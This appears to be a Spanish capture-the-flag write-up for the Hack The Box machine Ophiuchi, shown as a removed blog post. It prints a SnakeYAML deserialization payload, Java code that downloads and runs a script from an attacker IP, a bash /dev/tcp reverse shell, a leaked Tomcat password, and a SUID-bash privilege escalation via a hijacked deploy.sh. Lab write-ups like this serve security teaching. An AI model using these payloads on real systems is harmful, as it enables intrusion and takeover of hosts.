-http://10.10.10.227:8080 [200 OK] Cookies[JSESSIONID], Country[RESERVED][ZZ], HttpOnly[JSESSIONID], IP[10.10.10.227], Java, Title[Parse YAML]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;El comando nos reporta algo interesante &lt;code&gt;Parse YAML&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a abrir la web y vemos que la pagina efectivamente es un &lt;code&gt;Yaml Parser&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a realizar una busqueda para ver si hay un exploit o vulnerabilidad relacionado a &lt;code&gt;Yaml Parser&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Encontramos un exploit publico en un repositorio de &lt;code&gt;github&lt;/code&gt;:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;El exploit nos habla sobre deserializacion, pero que es deserializacion?&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Serializacion: Se refiere a un proceso por el cual se pasan un conjunto de bytes a un objeto entendible.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;En este repositorio nos habla de que mediante una deserealizacion insegura podemos conseguir &lt;code&gt;RCE&lt;/code&gt; “ejecucion remota de comandos”:&lt;/p&gt;
-
-&lt;p&gt;Basicamente se explota cuando una pagina tiene la funcion de parsear un archivo &lt;code&gt;YAML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;¿Pero como lo validamos entonces?&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Pues en el repositorio nos muestra un codigo en &lt;code&gt;yaml&lt;/code&gt; que podemos parsear en la web donde al ejecutarse podemos aprovecharlo para ejecutar una peticion a nuestra maquina.&lt;/p&gt;
-
-&lt;p&gt;Para lo cual primero debemos montarnos un servidor web, usaremos &lt;code&gt;python&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Despues realizamos el parseo:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y vemos como efectivamente recibimos una peticion.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Al buscar el CVE encotramos un articulo sobre la vulnerabilidad:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2017-1000207&quot;&gt;CVE-2017-1000207 / Vuln in Swagger Parser and Swagger Codegen, YAML parsing results arbitrary code execution&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Bueno entonces al pasarle nuestro payload &lt;code&gt;SNAKE YAML&lt;/code&gt; llamara al constructor &lt;code&gt;ScriptEngineFactory&lt;/code&gt; y este a su vez realizara una peticion a nuestra maquina.&lt;/p&gt;
-
-&lt;p&gt;Vamos a descargar el repositorio que genera los payloads para poder ejecutar codigo en el sistema:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;https://github.com/artsploit/yaml-payload&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Hacemos la clonacion del repositorio:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git clone https://github.com/artsploit/yaml-payload
-Clonando en 'yaml-payload'...
-remote: Enumerating objects: 10, done.
-remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10
-Recibiendo objetos: 100% (10/10), listo.
-❯ ls
- yaml-payload   2021-07-03-ophiuchi.md
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;El exploit nos dice que debemos poner el codigo que deseamos ejecutar en &lt;code&gt;AwesomeScriptEngineFactory.java&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tree
-.
-├── 2021-07-03-ophiuchi.md
-└── yaml-payload
-    ├── README.md
-    └── src
-        ├── artsploit
-        │   └── AwesomeScriptEngineFactory.java
-        └── META-INF
-            └── services
-                └── javax.script.ScriptEngineFactory
-
-5 directories, 4 files
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Observamos que se encuentra ahi el script &lt;code&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; lo abrimos y procedemos a modificar el codigo que queremos ejecutar&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;package artsploit;
-
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineFactory;
-import java.io.IOException;
-import java.util.List;
-
-public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
-
-    public AwesomeScriptEngineFactory() {
-        try {
-            Runtime.getRuntime().exec(&quot;curl http://10.10.16.4/reverse.sh -o /tmp/reverse.sh&quot;);
-            Runtime.getRuntime().exec(&quot;bash /tmp/reverse.sh&quot;);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-    @Override
-    public String getEngineName() {
-        return null;
-    }
-
-    @Override
-    public String getEngineVersion() {
-        return null;
-    }
-
-    @Override
-    public List&amp;lt;String&amp;gt; getExtensions() {
-        return null;
-    }
-
-    @Override
-    public List&amp;lt;String&amp;gt; getMimeTypes() {
-        return null;
-    }
-
-    @Override
-    public List&amp;lt;String&amp;gt; getNames() {
-        return null;
-    }
-
-    @Override
-    public String getLanguageName() {
-        return null;
-    }
-
-    @Override
-    public String getLanguageVersion() {
-        return null;
-    }
-
-    @Override
-    public Object getParameter(String key) {
-        return null;
-    }
-
-    @Override
-    public String getMethodCallSyntax(String obj, String m, String... args) {
-        return null;
-    }
-
-    @Override
-    public String getOutputStatement(String toDisplay) {
-        return null;
-    }
-
-    @Override
-    public String getProgram(String... statements) {
-        return null;
-    }
-
-    @Override
-    public ScriptEngine getScriptEngine() {
-        return null;
-    }
-}
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vemos en el script intentaremos al momento de realizar la desearializacion se ejecute una peticion que con &lt;code&gt;curl&lt;/code&gt; nos realize una peticion a un archivo el cual alojaremos een nuestra maquina y lo depositaremos en el directorio &lt;code&gt;tmp&lt;/code&gt; de la maquina victima con el nombre &lt;code&gt;reverse.sh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Seguidamente procederemos a crear un script en bash con el nombre &lt;code&gt;reverse.sh&lt;/code&gt; el cual al ejecutarse se encargara de ejecutarnos una peticion por el puerto &lt;code&gt;443&lt;/code&gt; para obtener una shell reversa.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash
-
-
-bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.4/443 0&amp;gt;&amp;amp;1
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Procedemo a compilar &lt;code&gt;AwesomeScriptEngineFactory.java&lt;/code&gt; y esto nos genera un archivo&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ javac src/artsploit/AwesomeScriptEngineFactory.java
-jar -cvf yaml-payload.jar -C src/ .
-manifiesto agregado
-ignorando entrada META-INF/
-agregando: META-INF/services/(entrada = 0) (salida = 0)(almacenado 0%)
-agregando: META-INF/services/javax.script.ScriptEngineFactory(entrada = 36) (salida = 38)(desinflado -5%)
-agregando: artsploit/(entrada = 0) (salida = 0)(almacenado 0%)
-agregando: artsploit/AwesomeScriptEngineFactory.java(entrada = 1575) (salida = 420)(desinflado 73%)
-agregando: artsploit/AwesomeScriptEngineFactory.class(entrada = 1678) (salida = 705)(desinflado 57%)
-
-❯ ls
- src   README.md   yaml-payload.jar
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;modificamos el codigo &lt;code&gt;YAML&lt;/code&gt; el cual insertaremos en la pagina &lt;code&gt;YAML Parser&lt;/code&gt;, para que realize una peticion a nuestra maquina en donde tendremos alojado el archivo &lt;code&gt;yaml-payload-jar&lt;/code&gt; y este a su vez nos ejecutara el codigo contenido que se encargara de realizar otra peticion a nuestro archivo &lt;code&gt;reverse.sh&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;!!javax.script.ScriptEngineManager [
-  !!java.net.URLClassLoader [[
-    !!java.net.URL [&quot;http://10.10.16.4/yaml-payload.jar&quot;]
-  ]]
-]
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Montamos un servidor con &lt;code&gt;python&lt;/code&gt; en donde tenemos los dos archivos:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- src   README.md   reverse.sh   yaml-payload.jar
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Enviamos la peticion:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;y estamos dentro como el usuario &lt;code&gt;tomcat&lt;/code&gt;:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Ophiuchi/web7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como siempre vamos a realizar el tratamiento de la &lt;code&gt;tty&lt;/code&gt; para obtener una full interactiva.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.227.
-Ncat: Connection from 10.10.10.227:56610.
-bash: cannot set terminal process group (796): Inappropriate ioctl for device
-bash: no job control in this shell
-tomcat@ophiuchi:/$ script /dev/null -c bash
-script /dev/null -c bash
-Script started, file is /dev/null
-tomcat@ophiuchi:/$ ^Z
-zsh: suspended  ncat -nlvp 443
-❯ stty raw -echo; fg
-[1]  + continued  ncat -nlvp 443
-                                reset xterm
-tomcat@ophiuchi:/$ export TERM=xterm
-tomcat@ophiuchi:/$ export SHELL=bash
-tomcat@ophiuchi:/$ stty rows 48 columns 184 #dependera del tamaño de tu pantalla &quot;ejecuta stty size&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Nos dirigimos al directorio &lt;code&gt;home&lt;/code&gt; y tratamos de leer la primera flag &lt;code&gt;user.txt&lt;/code&gt; pero vemos que no tenemos acceso:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tomcat@ophiuchi:/$ cd /home
-tomcat@ophiuchi:/home$ ls
-admin
-tomcat@ophiuchi:/home$ cd admin/
-tomcat@ophiuchi:/home/admin$ ls
-user.txt
-tomcat@ophiuchi:/home/admin$ cat user.txt 
-cat: user.txt: Permission denied
-tomcat@ophiuchi:/home/admin$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Como vemos que somos &lt;code&gt;tomcat&lt;/code&gt;, si recordamos su estructura sabemos que existe un archivo llamado &lt;code&gt;tomcat-users.xml&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tomcat@ophiuchi:/home/admin$ id
-uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
-tomcat@ophiuchi:/home/admin$ find / -name tomcat-users.xml 2&amp;gt;/dev/null
-/opt/tomcat/conf/tomcat-users.xml
-tomcat@ophiuchi:/home/admin$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Perfecto lo encontramos, ahora procedemos a leerlo y si efectivamente encontramos una credencial que corresponde al usuario &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
-              xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
-              xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
-	version=&quot;1.0&quot;&amp;gt;
-&amp;lt;user username=&quot;admin&quot; password=&quot;whythereisalimit&quot; roles=&quot;manager-gui,admin-gui&quot;/&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Procedemos esa contraseña con el usuario &lt;code&gt;admin&lt;/code&gt; y bingo!, somos el usuario ‘admin’ y ahora si podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tomcat@ophiuchi:/home/admin$ su admin
-Password: 
-admin@ophiuchi:~$ whoami
-admin
-admin@ophiuchi:~$ cat user.txt 
-330298484fe5a40840ac52e730fb7f15
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ahora anteriormente vimos en la fase de reconocimiento que el puerto &lt;code&gt;22&lt;/code&gt; estaba abierto, asi que por que no probemos a conectarnos por &lt;code&gt;ssh&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sshpass -p 'whythereisalimit' ssh admin@10.10.10.227
-❯ ssh admin@10.10.10.227
-The authenticity of host '10.10.10.227 (10.10.10.227)' can't be established.
-ECDSA key fingerprint is SHA256:OmZ+JsRqDVNaBWMshp7wogZM0KhSKkp1YmaILhRxSY0.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.227' (ECDSA) to the list of known hosts.
-admin@10.10.10.227's password: 
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Ejecutamos el comando &lt;code&gt;id&lt;/code&gt; para ver a que grupos pertenecemos y despues ejecutamos el comado &lt;code&gt;sudo -l&lt;/code&gt;, para ver si podemos ejecutar un comando como usuario privilegiado ya que somos el usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:~$ id
-uid=1000(admin) gid=1000(admin) groups=1000(admin)
-admin@ophiuchi:~$ sudo -l
-Matching Defaults entries for admin on ophiuchi:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User admin may run the following commands on ophiuchi:
-    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
-admin@ophiuchi:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos ejecutar un programa llamado &lt;code&gt;index.go&lt;/code&gt; usando el binario &lt;code&gt;/usr/bin/go&lt;/code&gt; como &lt;code&gt;root&lt;/code&gt; vale?&lt;/p&gt;
-
-&lt;p&gt;Veremos como podemos aprovecharnos de esto para escalar privilegios.&lt;/p&gt;
-
-&lt;p&gt;Nos dirigimos a la ruta donde se encuentra el archivo index.go.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:~$ cd /opt/wasm-functions/
-admin@ophiuchi:/opt/wasm-functions$ ls
-backup  deploy.sh  index  index.go  main.wasm
-admin@ophiuchi:/opt/wasm-functions$ ls -la
-total 3928
-drwxr-xr-x 3 root root    4096 Oct 14  2020 .
-drwxr-xr-x 5 root root    4096 Oct 14  2020 ..
-drwxr-xr-x 2 root root    4096 Oct 14  2020 backup
--rw-r--r-- 1 root root      88 Oct 14  2020 deploy.sh
--rwxr-xr-x 1 root root 2516736 Oct 14  2020 index
--rw-rw-r-- 1 root root     522 Oct 14  2020 index.go
--rwxrwxr-x 1 root root 1479371 Oct 14  2020 main.wasm
-admin@ophiuchi:/opt/wasm-functions$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Veamos el codigo del archivo &lt;code&gt;ìndex.go&lt;/code&gt; el cual podemos ejecutar:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;package main
-
-import (
-	&quot;fmt&quot;
-	wasm &quot;github.com/wasmerio/wasmer-go/wasmer&quot;
-	&quot;os/exec&quot;
-	&quot;log&quot;
-)
-
-
-func main() {
-	bytes, _ := wasm.ReadBytes(&quot;main.wasm&quot;)
-
-	instance, _ := wasm.NewInstance(bytes)
-	defer instance.Close()
-	init := instance.Exports[&quot;info&quot;]
-	result,_ := init()
-	f := result.String()
-	if (f != &quot;1&quot;) {
-		fmt.Println(&quot;Not ready to deploy&quot;)
-	} else {
-		fmt.Println(&quot;Ready to deploy&quot;)
-		out, err := exec.Command(&quot;/bin/sh&quot;, &quot;deploy.sh&quot;).Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	}
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Al ejecutar el &lt;code&gt;index.go&lt;/code&gt; vemos el mensaje &lt;code&gt;Not ready to deploy&lt;/code&gt; el cual seria un problema por que al depender del directorio actual en el que este para ejecutarse, puedo secuestrar el archivo ‘main.wasm’&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/opt/wasm-functions$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
-Not ready to deploy
-admin@ophiuchi:/opt/wasm-functions$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Volvemos a leer el script y vemos que hay una variable &lt;code&gt;f&lt;/code&gt; que es diferente de &lt;code&gt;1&lt;/code&gt;, y vemos que de ser lo contrario se daria la otra condicion que nos ejecutaria el &lt;code&gt;deploy.sh&lt;/code&gt;, el cual podriamos tratar de manipular.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-go&quot;&gt;package main
-
-import (
-	&quot;fmt&quot;
-	wasm &quot;github.com/wasmerio/wasmer-go/wasmer&quot;
-	&quot;os/exec&quot;
-	&quot;log&quot;
-)
-
-
-func main() {
-	bytes, _ := wasm.ReadBytes(&quot;main.wasm&quot;)
-
-	instance, _ := wasm.NewInstance(bytes)
-	defer instance.Close()
-	init := instance.Exports[&quot;info&quot;]
-	result,_ := init()
-	f := result.String()
-	if (f != &quot;1&quot;) {
-		fmt.Println(&quot;Not ready to deploy&quot;)
-	} else {
-		fmt.Println(&quot;Ready to deploy&quot;)
-		out, err := exec.Command(&quot;/bin/sh&quot;, &quot;deploy.sh&quot;).Output()
-		if err != nil {
-			log.Fatal(err)
-		}
-		fmt.Println(string(out))
-	}
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos ver si tenemos permiso de modificar el archivo &lt;code&gt;deploy.sh&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
-#!/bin/bash
-
-# ToDo
-# Create script to automatic deploy our new web at tomcat port 8080
-admin@ophiuchi:/opt/wasm-functions$ ls -l deploy.sh 
--rw-r--r-- 1 root root 88 Oct 14  2020 deploy.sh
-admin@ophiuchi:/opt/wasm-functions$
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Despues de ver los permisos que tenemos sobre el archivo, sabemos que no podemos modificarlo pero vimos anteriormente que el script &lt;code&gt;ìndex.go&lt;/code&gt; nos ejecuta el &lt;code&gt;deploy.sh&lt;/code&gt; de forma relativa, interesante; entonces yo podria crearme en el directorio &lt;code&gt;tmp&lt;/code&gt; mi propio archivo &lt;code&gt;deploy.sh&lt;/code&gt; y copiarme el &lt;code&gt;main.wasm&lt;/code&gt; ya que me los va a pillar desde alli y se podria tensa la cosa.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/opt/wasm-functions$ cd /tmp
-admin@ophiuchi:/tmp$ cp /opt/
-tomcat/         wasm-functions/ wasmer-go/      
-admin@ophiuchi:/tmp$ cp /opt/wasm-functions/main.wasm .
-admin@ophiuchi:/tmp$ touch deploy.sh
-admin@ophiuchi:/tmp$
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;En &lt;code&gt;deploy.sh&lt;/code&gt; lo que voy a intentar hacer es que este script me asigne una &lt;code&gt;suid&lt;/code&gt; a la &lt;code&gt;bash&lt;/code&gt;, para que como cualquier usuario en el sistema pueda spamear una consola como el propietario de forma temporal.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/bash
-
-chmod 4755 /bin/bash
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;y si intentamos ejecutar nuevamente el &lt;code&gt;index.go&lt;/code&gt; vemos que nuevamente nos sale.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ sudo  /usr/bin/go run /opt/wasm-functions/index.go
-Not ready to deploy
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Entonces quiero pensar que en el archivo &lt;code&gt;main.wasm&lt;/code&gt; del &lt;code&gt;index.go&lt;/code&gt; debe existir una condicional que hace que la variable &lt;code&gt;f&lt;/code&gt; no sea igual a &lt;code&gt;1&lt;/code&gt; y por ese motivo no entra a la condicion que me ejecute el &lt;code&gt;deploy.sh&lt;/code&gt;, pero si tratamos de leer el &lt;code&gt;main.wasm&lt;/code&gt; no podriamos por que no es de un formato legible.&lt;/p&gt;
-
-&lt;p&gt;La idea seria convertir el archivo &lt;code&gt;main.wasm&lt;/code&gt; a un formato textual y hacer poder intentar alterar los valores, para ello podemos usar una herramienta disponible en github:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/WebAssembly/wabt&quot;&gt;https://github.com/WebAssembly/wabt&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Como la maquina tiene &lt;code&gt;python3&lt;/code&gt; vamos a abrir un servidor web por el puerto &lt;code&gt;8000&lt;/code&gt; para traernos el archivo &lt;code&gt;main.wasm&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ which python3
-/usr/bin/python3
-admin@ophiuchi:/tmp$ python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.10.16.4 - - [25/Mar/2023 01:21:42] &quot;GET /main.wasm HTTP/1.1&quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;wget http://10.10.10.227:8000/main.wasm
---2023-03-25 01:21:43--  http://10.10.10.227:8000/main.wasm
-Conectando con 10.10.10.227:8000... conectado.
-Petición HTTP enviada, esperando respuesta... 200 OK
-Longitud: 1479371 (1,4M) [application/wasm]
-Grabando a: «main.wasm»
-
-main.wasm              100%[=========================&amp;gt;]   1,41M   276KB/s    en 7,4s    
-
-2023-03-25 01:21:51 (195 KB/s) - «main.wasm» guardado [1479371/1479371]
-
-❯ ls
- yaml-payload   2021-07-03-ophiuchi.md   main.wasm
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora usando la herramienta previamente instalada haremos uso de &lt;code&gt;wasm2wat&lt;/code&gt; sobre el archivo &lt;code&gt;main.wasm&lt;/code&gt; y lo exportaremos como &lt;code&gt;main.wat&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- yaml-payload   2021-07-03-ophiuchi.md   main.wasm
-❯ cat main.wat
-(module
-  (type (;0;) (func (result i32)))
-  (func $info (type 0) (result i32)
-    i32.const 0)
-  (table (;0;) 1 1 funcref)
-  (memory (;0;) 16)
-  (global (;0;) (mut i32) (i32.const 1048576))
-  (global (;1;) i32 (i32.const 1048576))
-  (global (;2;) i32 (i32.const 1048576))
-  (export &quot;memory&quot; (memory 0))
-  (export &quot;info&quot; (func $info))
-  (export &quot;__data_end&quot; (global 1))
-  (export &quot;__heap_base&quot; (global 2)))
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al leer el archivo vemos que hay una constante declarada con el valor de 0 &lt;code&gt;i32.const 0)&lt;/code&gt; la cual genera el problema por el cual el &lt;code&gt;index.go&lt;/code&gt; no nos puede ejecutar el &lt;code&gt;deploy.sh&lt;/code&gt;, asi que la modificaremos esa variable y le pondremos el valor de &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;(module
-  (type (;0;) (func (result i32)))
-  (func $info (type 0) (result i32)
-    i32.const 1)
-  (table (;0;) 1 1 funcref)
-  (memory (;0;) 16)
-  (global (;0;) (mut i32) (i32.const 1048576))
-  (global (;1;) i32 (i32.const 1048576))
-  (global (;2;) i32 (i32.const 1048576))
-  (export &quot;memory&quot; (memory 0))
-  (export &quot;info&quot; (func $info))
-  (export &quot;__data_end&quot; (global 1))
-  (export &quot;__heap_base&quot; (global 2)))
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Una vez modificada debemos volver a generar un archivo &lt;code&gt;main.wasm&lt;/code&gt;, el cual lo haremos con &lt;code&gt;wat2wasm&lt;/code&gt; y lo subimos a la maquina victima compartiendonos un servicio con &lt;code&gt;python&lt;/code&gt;no sin antes borrar el &lt;code&gt;main.wasm&lt;/code&gt; de antes.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /opt/wabt/build/wat2wasm main.wat &amp;gt; main.wasm
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ rm main.wasm 
-admin@ophiuchi:/tmp$ wget http://10.10.16.4/main.wasm
---2023-03-25 01:34:51--  http://10.10.16.4/main.wasm
-Connecting to 10.10.16.4:80... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 112 [application/wasm]
-Saving to: ‘main.wasm’
-
-main.wasm             100%[=========================&amp;gt;]     112  --.-KB/s    in 0s
-
-2023-03-25 01:34:52 (23.2 MB/s) - ‘main.wasm’ saved [112/112]
-
-admin@ophiuchi:/tmp$ ls
-deploy.sh
-hsperfdata_tomcat
-main.wasm
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Teniendo los archivos volvemos a ejecutar el &lt;code&gt;index.go&lt;/code&gt; con el privilegio asignado y&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ sudo -l
-Matching Defaults entries for admin on ophiuchi:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User admin may run the following commands on ophiuchi:
-    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
-admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
-Ready to deploy
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Nos lo ejecuta correctamente, entonces nos ejecuto el &lt;code&gt;deploy.sh&lt;/code&gt; veamos si es cierto:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;admin@ophiuchi:/tmp$ ls -ls /bin/bash
-1156 -rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y poom! ahora la bash es &lt;code&gt;suid&lt;/code&gt; solo debemos ejecutar ahora el comando &lt;code&gt;bash -p&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; y habriamos comprometido completamente el sistema :).&lt;/p&gt;
-
